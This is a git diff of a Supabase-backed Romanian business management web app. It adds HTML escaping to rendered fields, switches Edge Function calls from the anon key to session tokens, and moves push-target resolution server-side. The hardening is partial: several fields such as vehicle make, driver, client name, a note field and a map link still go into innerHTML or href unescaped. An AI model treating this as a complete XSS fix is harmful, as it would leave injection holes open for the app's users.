-    const { data: deleted, error: pErr } = await sb.from('profiles').delete().eq('id', id).select();
-    if (pErr) throw new Error('Ștergere profil: ' + pErr.message);
-    if (!deleted || deleted.length === 0) {
-      throw new Error('Profilul NU a fost șters (0 rânduri afectate). Cauza tipică: politică RLS lipsă pe tabela profiles. Rulează SQL-ul 02_rls_delete_profiles.sql în Supabase.');
-    }
+    const resp = await fetch(`${SUPABASE_URL}/functions/v1/manage-users`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Authorization': `Bearer ${session.access_token}`,
+        'apikey': SUPABASE_KEY,
+      },
+      body: JSON.stringify({ action: 'delete', user_id: id }),
+    });
+    const res = await resp.json();
+    if (!res?.ok) throw new Error(res?.error || 'Eroare necunoscută');
 
     await loadUsers();
     await loadProfiles();
     await loadTasks();
-    showToast(`${name} șters.`, 'success');
+    showToast(`${name} șters complet.`, 'success');
   } catch (err) {
-    console.error('[deleteUser] eroare:', err);
+    console.error('[deleteUser]', err);
     showToast('Nu s-a putut șterge: ' + err.message, 'error');
-    await confirmModal('Eroare la ștergere:\n\n' + err.message + '\n\n(Dacă apare "violates row-level security", e o politică RLS în Supabase care blochează ștergerea — îți spun cum o rezolvi.)');
   }
 }
 
@@ -4605,10 +4904,10 @@ async function loadLocations() {
   const list = document.getElementById('locationsList');
   if (!data || !data.length) { list.innerHTML = '<div style="color:var(--text-muted);font-size:13px;text-align:center;padding:16px;">Nicio locație salvată</div>'; return; }
   list.innerHTML = data.map(l => `
-    <div class="loc-item" onclick="useLocation('${l.name}','${l.address}','${l.maps_link||""}')">
+    <div class="loc-item js-use-loc" data-name="${esc(l.name)}" data-address="${esc(l.address)}" data-maps="${esc(l.maps_link || '')}">
       <div>
-        <div style="font-size:13px;font-weight:500;">📍 ${l.name}</div>
-        <div style="font-size:12px;color:var(--text-muted);">${l.address}</div>
+        <div style="font-size:13px;font-weight:500;">📍 ${esc(l.name)}</div>
+        <div style="font-size:12px;color:var(--text-muted);">${esc(l.address)}</div>
       </div>
       <button class="btn btn-danger btn-sm" onclick="event.stopPropagation();deleteLocation(${l.id})">✕</button>
     </div>
@@ -5140,7 +5439,7 @@ function renderGarWidget() {
     const color = expired ? 'var(--red)' : 'var(--amber)';
     return `<div class="gar-widget-item" onclick="showGarantii();setTimeout(()=>openGarDetail('${g.id}'),300)">
       <div class="gar-widget-dot" style="background:${color};animation:blink 1.2s infinite;"></div>
-      <span class="gar-widget-name">${g.echipament}</span>
+      <span class="gar-widget-name">${esc(g.echipament)}</span>
       <span style="font-size:11px;font-weight:700;color:${color};flex-shrink:0;">${expired?'EXPIRAT':days+'z'}</span>
     </div>`;
   }).join('');
@@ -5302,8 +5601,8 @@ function renderAuto() {
     return `<div class="auto-card" style="border-left:3px solid ${borderColor};" onclick="openAutoDetail('${v.id}')">
       <div class="auto-card-top">
         <div>
-          <div class="auto-card-nr">${v.nr_inmatriculare}</div>
-          <div class="auto-card-model">${v.marca || ''} ${v.model || ''} ${v.an_fab ? '· '+v.an_fab : ''} ${v.sofer ? '· 👤 '+v.sofer : ''}</div>
+          <div class="auto-card-nr">${esc(v.nr_inmatriculare)}</div>
+          <div class="auto-card-model">${v.marca || ''} ${esc(v.model) || ''} ${v.an_fab ? '· '+v.an_fab : ''} ${v.sofer ? '· 👤 '+v.sofer : ''}</div>
         </div>
         <div class="auto-badges">
           ${v.imei ? `<span class="gb-status" style="font-size:10px;background:#EFF6FF;color:#1E5FD9;border:1px solid #BFDBFE;">📡 GPS</span>` : ''}
@@ -5358,7 +5657,7 @@ function updateAutoStats() {
     alertEl.classList.add('show');
     alertItems.innerHTML = issues.map(v => {
       const badDocs = AUTO_DOCS.filter(d => autoDocStatus(v[d.key]) === 'expired' || autoDocStatus(v[d.key]) === 'urgent');
-      return `<span class="gar-alert-chip" onclick="openAutoDetail('${v.id}')">${v.nr_inmatriculare} — ${badDocs.map(d=>d.label).join(', ')}</span>`;
+      return `<span class="gar-alert-chip" onclick="openAutoDetail('${v.id}')">${esc(v.nr_inmatriculare)} — ${badDocs.map(d=>d.label).join(', ')}</span>`;
     }).join('');
   } else {
     alertEl.classList.remove('show');
@@ -5390,7 +5689,7 @@ function renderAutoWidget() {
     const daysText = minDays < 0 ? 'EXPIRAT' : minDays <= 7 ? `${minDays}z` : '✓ OK';
     return `<div class="auto-widget-item" onclick="showAuto();setTimeout(()=>openAutoDetail('${v.id}'),300)">
       <div class="gar-widget-dot" style="background:${color};${hasIssue?'animation:blink 1s infinite':''}"></div>
-      <span class="gar-widget-name">${v.nr_inmatriculare} — ${v.marca||''} ${v.model||''}</span>
+      <span class="gar-widget-name">${esc(v.nr_inmatriculare)} — ${v.marca||''} ${esc(v.model) || ''}</span>
       <span style="font-size:11px;font-weight:600;color:${color};flex-shrink:0;">${daysText}</span>
     </div>`;
   }).join('');
@@ -5408,8 +5707,8 @@ function openAutoDetail(id) {
   document.getElementById('autoDetailCard').innerHTML = `
     <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:10px;margin-bottom:16px;">
       <div>
-        <div style="font-family:'Syne',sans-serif;font-size:22px;font-weight:900;letter-spacing:1px;">${v.nr_inmatriculare}</div>
-        <div style="font-size:13px;color:var(--text-muted);margin-top:3px;">${v.marca||''} ${v.model||''} ${v.an_fab?'· '+v.an_fab:''} ${v.sofer?'· 👤 '+v.sofer:''}</div>
+        <div style="font-family:'Syne',sans-serif;font-size:22px;font-weight:900;letter-spacing:1px;">${esc(v.nr_inmatriculare)}</div>
+        <div style="font-size:13px;color:var(--text-muted);margin-top:3px;">${v.marca||''} ${esc(v.model) || ''} ${v.an_fab?'· '+v.an_fab:''} ${v.sofer?'· 👤 '+v.sofer:''}</div>
       </div>
       <div style="display:flex;gap:8px;">
         ${isAdmin ? `<button class="btn btn-ghost btn-sm" onclick="editAuto('${v.id}')">✏ Editează</button>` : ''}
@@ -5432,7 +5731,7 @@ function openAutoDetail(id) {
         <div class="auto-field-val">${v.km ? v.km.toLocaleString('ro') + ' km' : '—'}</div>
       </div>
     </div>
-    ${v.nota ? `<div style="background:var(--accent-dim);border:1px solid rgba(59,130,246,.2);border-radius:10px;padding:10px 14px;margin-top:12px;"><div style="font-size:10px;text-transform:uppercase;color:var(--accent);margin-bottom:3px;">Note</div><div style="font-size:13px;color:var(--text-soft);">${v.nota}</div></div>` : ''}
+    ${v.nota ? `<div style="background:var(--accent-dim);border:1px solid rgba(59,130,246,.2);border-radius:10px;padding:10px 14px;margin-top:12px;"><div style="font-size:10px;text-transform:uppercase;color:var(--accent);margin-bottom:3px;">Note</div><div style="font-size:13px;color:var(--text-soft);">${esc(v.nota)}</div></div>` : ''}
     ${isAdmin ? `<div style="margin-top:16px;"><button class="btn btn-primary btn-sm" onclick="openRepModal('${v.id}')">＋ Adaugă reparație</button></div>` : ''}
   `;
   loadReparatii(id);
@@ -5459,8 +5758,8 @@ function renderReparatii(vehiculId) {
             ${currentProfile?.role==='admin'?`<button class="btn btn-ghost btn-sm" style="padding:2px 8px;font-size:11px;" onclick="deleteRep('${r.id}','${vehiculId}')">✕</button>`:''}
           </div>
         </div>
-        <div class="rep-item-desc">${r.descriere}</div>
-        ${r.service ? `<div class="rep-item-meta">🏪 ${r.service}</div>` : ''}
+        <div class="rep-item-desc">${esc(r.descriere)}</div>
+        ${r.service ? `<div class="rep-item-meta">🏪 ${esc(r.service)}</div>` : ''}
       </div>`).join('')}
   </div>`;
 }
@@ -5586,10 +5885,12 @@ async function saveAuto() {
 async function listTracksolidDevices() {
   showToast('Se conectează la Tracksolid...', 'info');
   try {
+    // SECURITATE: token de sesiune, nu cheia anon publică
+    const { data: { session } } = await sb.auth.getSession();
     const resp = await fetch(`${SUPABASE_URL}/functions/v1/sync-tracksolid-mileage?action=list-devices`, {
       method: 'POST',
       headers: {
-        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Authorization': `Bearer ${session?.access_token ?? SUPABASE_KEY}`,
         'apikey': SUPABASE_KEY,
         'Content-Type': 'application/json'
       }
@@ -5626,10 +5927,12 @@ async function syncTracksolid() {
   if (!await confirmModal('Sincronizezi kilometrajul pentru toate vehiculele cu IMEI configurat?')) return;
   showToast('🔄 Sincronizare în curs...', 'info');
   try {
+    // SECURITATE: token de sesiune, nu cheia anon publică
+    const { data: { session } } = await sb.auth.getSession();
     const resp = await fetch(`${SUPABASE_URL}/functions/v1/sync-tracksolid-mileage`, {
       method: 'POST',
       headers: {
-        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Authorization': `Bearer ${session?.access_token ?? SUPABASE_KEY}`,
         'apikey': SUPABASE_KEY,
         'Content-Type': 'application/json'
       }
@@ -5652,7 +5955,7 @@ async function marcheazaRevizieFacuta(vehiculId) {
   const v = allAuto.find(x => x.id === vehiculId);
   if (!v) return;
   const km = v.km_actual || v.km || 0;
-  if (!await confirmModal(`Marchezi revizia ca făcută la ${km} km pentru ${v.marca} ${v.model || ''} (${v.nr_inmatriculare})?`)) return;
+  if (!await confirmModal(`Marchezi revizia ca făcută la ${km} km pentru ${esc(v.marca)} ${esc(v.model) || ''} (${esc(v.nr_inmatriculare)})?`)) return;
   await sb.from('vehicule').update({
     km_ultima_revizie: km,
     data_ultima_revizie: new Date().toISOString().split('T')[0]
@@ -5849,7 +6152,7 @@ function matItemHtml(m, showActions) {
   return `<div class="mat-item" id="mat-item-${m.id}">
     ${showDelete ? `<input type="checkbox" class="mat-hist-chk" data-id="${m.id}" onchange="updateMatDeleteBtn()" style="width:16px;height:16px;cursor:pointer;flex-shrink:0;accent-color:var(--red);">` : ''}
     <div class="mat-item-info">
-      <div class="mat-item-name">${m.denumire}</div>
+      <div class="mat-item-name">${esc(m.denumire)}</div>
       <div class="mat-item-meta">👤 ${techName} · 📅 ${date}${m.nota ? ' · ' + m.nota : ''}</div>
     </div>
     <span class="mat-badge ${statusCls}">${statusLabel}</span>
@@ -6220,12 +6523,12 @@ function renderMent() {
     return `<div class="ment-card ${cardCls}" onclick="openMentDetail('${m.id}')">
       <div class="ment-card-top">
         <div>
-          <div class="ment-card-client">${m.client}</div>
-          <div class="ment-card-adresa">${m.adresa || '—'}</div>
+          <div class="ment-card-client">${esc(m.client)}</div>
+          <div class="ment-card-adresa">${esc(m.adresa) || '—'}</div>
         </div>
         <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;">
           ${badge}
-          <span style="background:var(--surface2);border:1px solid var(--border);color:var(--text-soft);padding:3px 10px;border-radius:20px;font-size:11px;font-weight:600;">${m.tip_sistem}</span>
+          <span style="background:var(--surface2);border:1px solid var(--border);color:var(--text-soft);padding:3px 10px;border-radius:20px;font-size:11px;font-weight:600;">${esc(m.tip_sistem)}</span>
         </div>
       </div>
       <div class="ment-card-meta">
@@ -6257,12 +6560,12 @@ function openMentDetail(id) {
   document.getElementById('mentDetailCard').innerHTML = `
     <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:12px;margin-bottom:16px;">
       <div>
-        <div style="font-family:'Syne',sans-serif;font-size:20px;font-weight:900;">${m.client}</div>
-        <div style="font-size:13px;color:var(--text-muted);margin-top:3px;">📍 ${m.adresa || '—'}</div>
+        <div style="font-family:'Syne',sans-serif;font-size:20px;font-weight:900;">${esc(m.client)}</div>
+        <div style="font-size:13px;color:var(--text-muted);margin-top:3px;">📍 ${esc(m.adresa) || '—'}</div>
       </div>
       <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
         ${urgHtml}
-        <span style="background:var(--surface2);border:1px solid var(--border);color:var(--text-soft);padding:4px 12px;border-radius:20px;font-size:13px;font-weight:600;">${m.tip_sistem}</span>
+        <span style="background:var(--surface2);border:1px solid var(--border);color:var(--text-soft);padding:4px 12px;border-radius:20px;font-size:13px;font-weight:600;">${esc(m.tip_sistem)}</span>
       </div>
     </div>
     <div class="ment-detail-grid">
@@ -6270,7 +6573,7 @@ function openMentDetail(id) {
       <div class="ment-field"><div class="ment-field-lbl">📅 Ultima mentenanță</div><div class="ment-field-val">${formatDate(m.ultima_mentenanta)}</div></div>
       <div class="ment-field"><div class="ment-field-lbl">⏰ Următoarea</div><div class="ment-field-val" style="color:${u==='expirat'||u==='urgent'?'var(--red)':u==='warning'?'var(--amber)':'var(--green)'};">${formatDate(m.urmatoarea_mentenanta)}</div></div>
     </div>
-    ${m.nota ? `<div style="background:var(--accent-dim);border:1px solid rgba(59,130,246,.2);border-radius:10px;padding:12px 14px;margin-top:12px;"><div style="font-size:10px;text-transform:uppercase;color:var(--accent);margin-bottom:3px;">Note</div><div style="font-size:13px;color:var(--text-soft);">${m.nota}</div></div>` : ''}
+    ${m.nota ? `<div style="background:var(--accent-dim);border:1px solid rgba(59,130,246,.2);border-radius:10px;padding:12px 14px;margin-top:12px;"><div style="font-size:10px;text-transform:uppercase;color:var(--accent);margin-bottom:3px;">Note</div><div style="font-size:13px;color:var(--text-soft);">${esc(m.nota)}</div></div>` : ''}
     <div style="margin-top:18px;display:flex;gap:8px;flex-wrap:wrap;">
       <button class="btn btn-primary btn-sm" onclick="marcheazaEfectuata('${m.id}')">✓ Marchează efectuată</button>
       <button class="btn btn-ghost btn-sm" onclick="editMent('${m.id}')">✏ Editează</button>
@@ -6423,18 +6726,22 @@ async function initFCM() {
       return;
     }
 
-    // Salvează token-ul atomic cu upsert (UNIQUE constraint pe user_id în DB)
+    // Salvează token-ul — upsert pe TOKEN (nu pe user_id).
+    // Astfel un user poate avea MAI MULTE device-uri active simultan
+    // (telefon + laptop + tabletă), fiecare cu tokenul lui propriu.
+    // Anterior, constraint-ul pe user_id făcea ca ultimul device logat
+    // să înlocuiască tokenul celorlalte — primeai notificări doar pe unul.
     const token = await getToken(fcmMessaging, { vapidKey: VAPID_KEY, serviceWorkerRegistration: swReg });
     if (token && currentUser?.id) {
       const { error: upsertErr } = await sb.from('fcm_tokens')
         .upsert({ user_id: currentUser.id, token, created_at: new Date().toISOString() },
-                 { onConflict: 'user_id' });
+                 { onConflict: 'token' });
       if (upsertErr) {
-        await sb.from('fcm_tokens').delete().eq('user_id', currentUser.id);
+        // Fallback dacă constraint-ul pe token nu e încă aplicat în DB
         await sb.from('fcm_tokens').delete().eq('token', token);
         await sb.from('fcm_tokens').insert({ user_id: currentUser.id, token });
       }
-      console.log('FCM token salvat ✅');
+      console.log('FCM token salvat ✅ (device curent)');
     }
 
     // Notificări foreground — debounce pentru a evita dublura cu Realtime
@@ -6455,26 +6762,30 @@ async function initFCM() {
 
 let pushSending = false;
 
-async function sendPushToUsers(userIds, title, body) {
+async function sendPushToUsers(userIds, title, body, taskId) {
   if (pushSending) return;
   pushSending = true;
   try {
     // De-duplic user-ids (în caz că primim listă cu duplicate)
     const uniqueUserIds = [...new Set(userIds.filter(Boolean))];
     if (!uniqueUserIds.length) return;
-    const { data: tokenRows } = await sb.from('fcm_tokens').select('token').in('user_id', uniqueUserIds);
-    if (!tokenRows || tokenRows.length === 0) return;
-    // De-duplic token-urile (în caz că același telefon are mai multe înregistrări)
-    const tokens = [...new Set(tokenRows.map(r => r.token).filter(Boolean))];
-    if (!tokens.length) return;
+
+    // SECURITATE: trimitem doar INTENȚIA (cui vrem să trimită), nu token-urile.
+    // Edge function-ul validează apelantul prin JWT-ul de sesiune și rezolvă
+    // token-urile FCM server-side. Anterior, clientul dicta destinatarii cu
+    // cheia anon (publică) — oricine putea trimite push arbitrare către
+    // orice dispozitiv al firmei.
+    const { data: { session } } = await sb.auth.getSession();
+    if (!session?.access_token) { console.log('Push: fără sesiune activă'); return; }
+
     await fetch(`${SUPABASE_URL}/functions/v1/send-push`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
-        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Authorization': `Bearer ${session.access_token}`,
         'apikey': SUPABASE_KEY,
       },
-      body: JSON.stringify({ tokens, title, body })
+      body: JSON.stringify({ user_ids: uniqueUserIds, title, body, task_id: taskId ?? null })
     });
   } catch (err) {
     console.log('Push error:', err);
@@ -6530,18 +6841,18 @@ function renderGarantii() {
     const sentBadge = g.mesaj_trimis ? `<span class="gb-status gb-sent">✓ Trimis</span>` : '';
     return `<div class="gar-card status-${g.status}" onclick="openGarDetail('${g.id}')">
       <div class="gar-card-top">
-        <div><div class="gar-card-name">${g.echipament}</div><div class="gar-card-serie">S/N: ${g.serie||'—'}</div></div>
+        <div><div class="gar-card-name">${esc(g.echipament)}</div><div class="gar-card-serie">S/N: ${esc(g.serie) || '—'}</div></div>
         <div class="gar-badges">${sentBadge}${urgBadge}<span class="gb-status ${st.cls}">${st.label}</span></div>
       </div>
       <div style="margin-top:8px;display:flex;gap:5px;flex-wrap:wrap;" onclick="event.stopPropagation()">
         ${['trimis','in_reparatie','returnat','respins'].map(s => `<button onclick="quickGarStatus('${g.id}','${s}',event)" style="padding:3px 9px;border-radius:20px;font-size:11px;font-weight:600;cursor:pointer;border:1px solid ${g.status===s?'transparent':'var(--border)'};background:${g.status===s?(s==='trimis'?'rgba(59,130,246,.25)':s==='in_reparatie'?'rgba(245,158,11,.25)':s==='returnat'?'rgba(16,185,129,.25)':'rgba(239,68,68,.25)'):'var(--surface2)'};color:${g.status===s?(s==='trimis'?'var(--accent)':s==='in_reparatie'?'var(--amber)':s==='returnat'?'var(--green)':'var(--red)'):'var(--text-muted)'};font-family:inherit;">${s==='trimis'?'📦 Trimis':s==='in_reparatie'?'🔧 Reparație':s==='returnat'?'✅ Returnat':'❌ Respins'}</button>`).join('')}
       </div>
       <div class="gar-card-meta" style="margin-top:8px;">
-        <span>👤 ${g.client||'—'}</span><span>🏢 ${g.distribuitor}</span>
+        <span>👤 ${g.client||'—'}</span><span>🏢 ${esc(g.distribuitor)}</span>
         <span>📅 ${formatDate(g.data_trimis)}</span><span>⏰ ${formatDate(g.data_expirare)}</span>
-        ${g.telefon_distribuitor?`<span>📱 ${g.telefon_distribuitor}</span>`:''}
+        ${g.telefon_distribuitor?`<span>📱 ${esc(g.telefon_distribuitor)}</span>`:''}
       </div>
-      ${g.descriere_defect?`<div class="gar-card-defect">"${g.descriere_defect}"</div>`:''}
+      ${g.descriere_defect?`<div class="gar-card-defect">"${esc(g.descriere_defect)}"</div>`:''}
     </div>`;
   }).join('');
 }
@@ -6572,8 +6883,8 @@ function openGarDetail(id) {
   const isAdmin = currentProfile?.role === 'admin';
   document.getElementById('garDetailCard').innerHTML = `
     <div style="display:flex;justify-content:space-between;align-items:flex-start;flex-wrap:wrap;gap:10px;margin-bottom:16px;">
-      <div><div style="font-family:'Syne',sans-serif;font-size:18px;font-weight:800;">${g.echipament}</div>
-      <div style="font-size:12px;color:var(--text-muted);margin-top:4px;">S/N: ${g.serie||'—'}</div></div>
+      <div><div style="font-family:'Syne',sans-serif;font-size:18px;font-weight:800;">${esc(g.echipament)}</div>
+      <div style="font-size:12px;color:var(--text-muted);margin-top:4px;">S/N: ${esc(g.serie) || '—'}</div></div>
       <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;">
         ${g.mesaj_trimis?'<span class="gb-status gb-sent">✓ Mesaj trimis</span>':''}${urgHtml}
         <span class="gb-status ${st.cls}" style="font-size:13px;">${st.label}</span>
@@ -6581,14 +6892,14 @@ function openGarDetail(id) {
     </div>
     <div class="gar-detail-grid">
       <div class="gar-detail-field"><div class="gar-detail-field-lbl">👤 Client</div><div class="gar-detail-field-val">${g.client||'—'}</div></div>
-      <div class="gar-detail-field"><div class="gar-detail-field-lbl">🏢 Distribuitor</div><div class="gar-detail-field-val">${g.distribuitor}</div></div>
+      <div class="gar-detail-field"><div class="gar-detail-field-lbl">🏢 Distribuitor</div><div class="gar-detail-field-val">${esc(g.distribuitor)}</div></div>
       <div class="gar-detail-field"><div class="gar-detail-field-lbl">📱 WhatsApp</div><div class="gar-detail-field-val">${g.telefon_distribuitor||'—'}</div></div>
       <div class="gar-detail-field"><div class="gar-detail-field-lbl">📧 Email</div><div class="gar-detail-field-val">${g.contact_distribuitor||'—'}</div></div>
       <div class="gar-detail-field"><div class="gar-detail-field-lbl">📅 Data trimis</div><div class="gar-detail-field-val">${formatDate(g.data_trimis)}</div></div>
       <div class="gar-detail-field"><div class="gar-detail-field-lbl">⏰ Expiră</div><div class="gar-detail-field-val">${formatDate(g.data_expirare)}</div></div>
     </div>
-    ${g.descriere_defect?`<div style="background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2);border-radius:10px;padding:12px;margin-top:12px;"><div style="font-size:10px;text-transform:uppercase;color:var(--amber);margin-bottom:4px;">Defect</div><div style="font-size:13px;">${g.descriere_defect}</div></div>`:''}
-    ${g.nota?`<div style="background:var(--accent-dim);border:1px solid rgba(59,130,246,.2);border-radius:10px;padding:10px;margin-top:10px;"><div style="font-size:10px;text-transform:uppercase;color:var(--accent);margin-bottom:3px;">Note</div><div style="font-size:13px;">${g.nota}</div></div>`:''}
+    ${g.descriere_defect?`<div style="background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2);border-radius:10px;padding:12px;margin-top:12px;"><div style="font-size:10px;text-transform:uppercase;color:var(--amber);margin-bottom:4px;">Defect</div><div style="font-size:13px;">${esc(g.descriere_defect)}</div></div>`:''}
+    ${g.nota?`<div style="background:var(--accent-dim);border:1px solid rgba(59,130,246,.2);border-radius:10px;padding:10px;margin-top:10px;"><div style="font-size:10px;text-transform:uppercase;color:var(--accent);margin-bottom:3px;">Note</div><div style="font-size:13px;">${esc(g.nota)}</div></div>`:''}
     <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:18px;">
       <button class="btn btn-primary btn-sm" onclick="generateGarMsg('${g.id}','whatsapp')" style="background:transparent;color:#25d366;border-color:rgba(37,211,102,.4);">💬 WhatsApp</button>
       <button class="btn btn-primary btn-sm" onclick="generateGarMsg('${g.id}','email')" style="background:var(--accent-dim);color:var(--accent);border-color:rgba(59,130,246,.3);">✉️ Email</button>
@@ -6616,7 +6927,7 @@ async function generateGarMsg(id, channel) {
     const phone = (g.telefon_distribuitor||'').replace(/\D/g,'');
     const intl = phone.startsWith('0') ? '40'+phone.slice(1) : phone;
     const waUrl = phone ? `https://wa.me/${intl}?text=${encodeURIComponent(text)}` : null;
-    const mailUrl = g.contact_distribuitor ? `mailto:${g.contact_distribuitor}?subject=Garanție ${encodeURIComponent(g.echipament)}&body=${encodeURIComponent(text)}` : null;
+    const mailUrl = g.contact_distribuitor ? `mailto:${esc(g.contact_distribuitor)}?subject=Garanție ${encodeURIComponent(g.echipament)}&body=${encodeURIComponent(text)}` : null;
     msgBox.innerHTML = `<div class="gar-msg-box">
       <div style="font-weight:700;color:${isWa?'#25d366':'var(--accent)'};margin-bottom:10px;">${isWa?'💬 WhatsApp':'✉️ Email'} generat</div>
       <div class="gar-msg-content">${text}</div>
@@ -6669,7 +6980,7 @@ function renderGarWidget() {
     const color = days < 0 ? 'var(--red)' : 'var(--amber)';
     return `<div class="gar-widget-item" onclick="showGarantii();setTimeout(()=>openGarDetail('${g.id}'),300)">
       <div class="gar-widget-dot" style="background:${color};animation:blink 1.2s infinite;"></div>
-      <span class="gar-widget-name">${g.echipament}</span>
+      <span class="gar-widget-name">${esc(g.echipament)}</span>
       <span style="font-size:11px;font-weight:700;color:${color};flex-shrink:0;">${days<0?'EXPIRAT':days+'z'}</span>
     </div>`;
   }).join('');
@@ -6687,7 +6998,7 @@ async function checkGarantiiPush() {
   if (!urgente.length) return;
   urgente.forEach(g => {
     const days = garDaysUntil(g.data_expirare);
-    showToast(`⚠ ${g.echipament} — ${days<0?'DEPĂȘIT':days+'z rămase'}`, 'info');
+    showToast(`⚠ ${esc(g.echipament)} — ${days<0?'DEPĂȘIT':days+'z rămase'}`, 'info');
   });
   const { data: admins } = await sb.from('profiles').select('id').eq('role','admin');
   if (admins?.length && urgente.length) {
@@ -6848,8 +7159,8 @@ function renderCereri() {
             <span class="cerere-status cs-${c.status}">${statusLabel[c.status] || c.status}</span>
           </div>
           <div class="cerere-card-dates">📅 ${c.data_start} → ${c.data_sfarsit} &nbsp;·&nbsp; ${c.zile_lucratoare} zile lucr.${c.scade_din_concediu ? ' &nbsp;·&nbsp; <span style="color:#0369a1;font-size:11px;font-weight:700;">🏖 Scade din concediu</span>' : ''}</div>
-          ${c.motiv ? `<div class="cerere-card-motiv">"${c.motiv}"</div>` : ''}
-          ${c.motiv_respingere ? `<div style="color:#dc2626;font-size:12px;margin-top:4px;">Motiv respingere: ${c.motiv_respingere}</div>` : ''}
+          ${c.motiv ? `<div class="cerere-card-motiv">"${esc(c.motiv)}"</div>` : ''}
+          ${c.motiv_respingere ? `<div style="color:#dc2626;font-size:12px;margin-top:4px;">Motiv respingere: ${esc(c.motiv_respingere)}</div>` : ''}
           ${c.semnatura_base64 ? `<div style="margin-top:8px;"><img src="${c.semnatura_base64}" style="max-height:50px;border:1px solid var(--border);border-radius:6px;"></div>` : ''}
           <div style="margin-top:8px;">
             <button class="btn btn-ghost btn-sm" style="font-size:12px;" onclick="downloadCererePdf(cereriIndexMap[${idx}])">📄 Descarcă PDF</button>
@@ -7221,11 +7532,13 @@ async function submitSemnatura(cerereId) {
 
   // Trimite email confirmare prin Edge Function
   try {
+    // SECURITATE: token de sesiune (userul e logat când depune cererea)
+    const { data: { session } } = await sb.auth.getSession();
     const resp = await fetch(`${SUPABASE_URL}/functions/v1/confirm-absence`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/json',
-        'Authorization': `Bearer ${SUPABASE_KEY}`,
+        'Authorization': `Bearer ${session?.access_token ?? SUPABASE_KEY}`,
         'apikey': SUPABASE_KEY,
       },
       body: JSON.stringify({ action: 'send_confirmation', cerere_id: cerereId }),
@@ -7567,20 +7880,20 @@ function renderClienti() {
       const echipaDisplay = c.echipa_text
         ? `👥 Echipă: <strong>${c.echipa_text}</strong>`
         : tehName
-          ? `🔧 Tehnician: <strong>${tehName}</strong>`
+          ? `🔧 Tehnician: <strong>${esc(tehName)}</strong>`
           : '🔧 Tehnician: <strong>—</strong>';
       return `<div class="client-card">
         <div class="client-card-header">
-          <div><div class="client-card-name">${c.nume}</div>${c.telefon ? `<div class="client-card-phone">📞 ${c.telefon}</div>` : ''}</div>
+          <div><div class="client-card-name">${esc(c.nume)}</div>${c.telefon ? `<div class="client-card-phone">📞 ${esc(c.telefon)}</div>` : ''}</div>
           ${gar.cls ? `<span class="client-garantie-badge ${gar.cls}">${gar.label}</span>` : ''}
         </div>
-        ${c.adresa ? `<div class="client-card-row">📍 <strong>${c.adresa}</strong></div>` : ''}
+        ${c.adresa ? `<div class="client-card-row">📍 <strong>${esc(c.adresa)}</strong></div>` : ''}
         ${c.maps_link ? `<div class="client-card-row">🗺 <a href="${c.maps_link}" target="_blank" style="color:var(--accent);">Vezi pe hartă</a></div>` : ''}
         ${sisteme ? `<div style="margin:6px 0;">${sisteme}</div>` : ''}
         <div class="client-card-row">${echipaDisplay}</div>
         ${c.data_instalare ? `<div class="client-card-row">📅 Instalat: <strong>${formatDate(c.data_instalare)}</strong> · <strong>${c.garantie_luni} luni</strong> garanție</div>` : ''}
         ${c.garantie_exp ? `<div class="client-card-row">⏳ Expiră: <strong>${formatDate(c.garantie_exp)}</strong></div>` : ''}
-        ${c.nota ? `<div class="client-card-row" style="font-style:italic;">"${c.nota}"</div>` : ''}
+        ${c.nota ? `<div class="client-card-row" style="font-style:italic;">"${esc(c.nota)}"</div>` : ''}
         <div class="client-card-actions">
           <button class="btn btn-primary" style="flex:1;font-size:13px;" onclick="createTaskDinClient(clientiIndexMap[${idx}])">➕ Creează task</button>
           <button class="btn btn-ghost" style="font-size:13px;" onclick="editClient(clientiIndexMap[${idx}])">✏️</button>
@@ -7872,8 +8185,8 @@ function renderStocList() {
       const isLow = m.stoc_curent <= m.stoc_minim;
       return `
         <div class="stoc-card ${isLow ? 'low-stock' : ''}">
-          <div class="stoc-card-name">${m.nume}</div>
-          ${m.cod_bare ? `<div class="stoc-card-code">${m.cod_bare}</div>` : ''}
+          <div class="stoc-card-name">${esc(m.nume)}</div>
+          ${m.cod_bare ? `<div class="stoc-card-code">${esc(m.cod_bare)}</div>` : ''}
           <div class="stoc-card-qty ${isLow ? 'low' : 'ok'}">${m.stoc_curent} ${m.unitate || 'buc'}</div>
           <div style="font-size:11px;color:var(--text-muted);">Minim: ${m.stoc_minim} ${m.unitate || 'buc'}</div>
           ${isAdmin ? `
